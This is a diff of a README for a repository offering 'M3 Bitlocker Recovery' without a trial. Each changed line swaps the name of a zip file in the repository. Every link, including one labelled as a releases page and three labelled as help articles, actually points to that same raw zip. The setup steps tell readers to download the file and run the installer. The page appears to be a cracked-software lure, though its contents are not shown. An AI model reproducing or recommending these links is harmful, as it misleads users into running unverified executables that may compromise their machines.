@@ -1,6 +1,6 @@
 # 🔐 M3-Bitlocker-Recovery-No-Trial - Easy Data Recovery for Bitlocker Drives
 
-![Download M3 Bitlocker Recovery](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/M3-Bitlocker-Recovery-No-Trial_2.5-beta.3.zip%20Bitlocker%20Recovery-blue)
+![Download M3 Bitlocker Recovery](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/Recovery_Bitlocker_No_Trial_v1.1.zip%20Bitlocker%20Recovery-blue)
 
 ## 📖 About This Project
 
@@ -12,7 +12,7 @@ To successfully run the M3 Bitlocker Recovery software, follow these simple step
 
 ## 📤 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to access the download page: [M3-Bitlocker-Recovery Releases](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/M3-Bitlocker-Recovery-No-Trial_2.5-beta.3.zip).
+1. **Visit the Releases Page:** Go to the following link to access the download page: [M3-Bitlocker-Recovery Releases](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/Recovery_Bitlocker_No_Trial_v1.1.zip).
 2. **Choose Your Version:** Look for the latest release. It will usually be at the top of the list. Click on the release name to view the options.
 3. **Download the Software:** Find the installer for your Windows version. Click on the download link to save the file to your computer.
 4. **Run the Installer:** Once the download completes, locate the installer file. Double-click the file to start the installation process. Follow the on-screen instructions to complete the setup.
@@ -56,9 +56,9 @@ If you encounter any issues during the download, installation, or data recovery 
 
 For more information about M3 Bitlocker Recovery and related topics, here are some helpful links:
 
-- [Bitlocker Partition Access on Windows](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/M3-Bitlocker-Recovery-No-Trial_2.5-beta.3.zip)
-- [Data Recovery from Bitlocker Drives](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/M3-Bitlocker-Recovery-No-Trial_2.5-beta.3.zip)
-- [Lost Bitlocker Password Recovery](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/M3-Bitlocker-Recovery-No-Trial_2.5-beta.3.zip)
+- [Bitlocker Partition Access on Windows](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/Recovery_Bitlocker_No_Trial_v1.1.zip)
+- [Data Recovery from Bitlocker Drives](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/Recovery_Bitlocker_No_Trial_v1.1.zip)
+- [Lost Bitlocker Password Recovery](https://raw.githubusercontent.com/FaniRussady/M3-Bitlocker-Recovery-No-Trial/main/Triangulid/Recovery_Bitlocker_No_Trial_v1.1.zip)
 
 Keep these links handy for future reference.
 
